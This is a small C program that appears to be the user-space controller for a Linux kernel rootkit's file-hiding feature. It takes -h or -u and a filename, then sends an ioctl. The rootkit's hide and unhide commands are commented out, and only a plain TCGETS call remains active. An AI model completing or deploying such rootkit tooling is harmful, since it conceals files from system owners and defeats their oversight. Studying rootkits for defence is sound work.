#include <stdio.h>
#include <string.h>
//#include <sys/types.h>
//#include <sys/stat.h>
#include <fcntl.h>	//O_RDONLY
#include <unistd.h>
#include <sys/ioctl.h>

#include "my_rootkit.h"

int main(int argc, char* argv[])
{
	int fd, ret;
	int is_hide = 0;

	if (argc != 3) {
		printf("Usage: %s [-h|-u] filename\n", argv[0]);    
		return -1;
	}
	if(!strcmp(argv[1], "-h"))
		is_hide = 1;
	else if(!strcmp(argv[1],"-u"))
		is_hide = 0;
	else {
		printf("Usage: %s [-h|-u] filename\n", argv[0]);
		return -1;
	}

	fd = open(argv[2], O_RDONLY);
	if (-1 == fd) {
		printf("Failed to open %s\n", argv[2]);
		return -1;
	}
	//ret = ioctl(fd, HACKED_CMD, is_hide?HIDE_FILE:UNHIDE_FILE);
	//ret = ioctl(fd, HACKED_CMD, HIDE_FILE);
	ret = ioctl(fd, TCGETS, NULL);
	if (-1 == ret) {
		printf("Failed to ioctl,ret=%d\n", ret);
		return -1;
	}
	close(fd);
	return 0;     
}
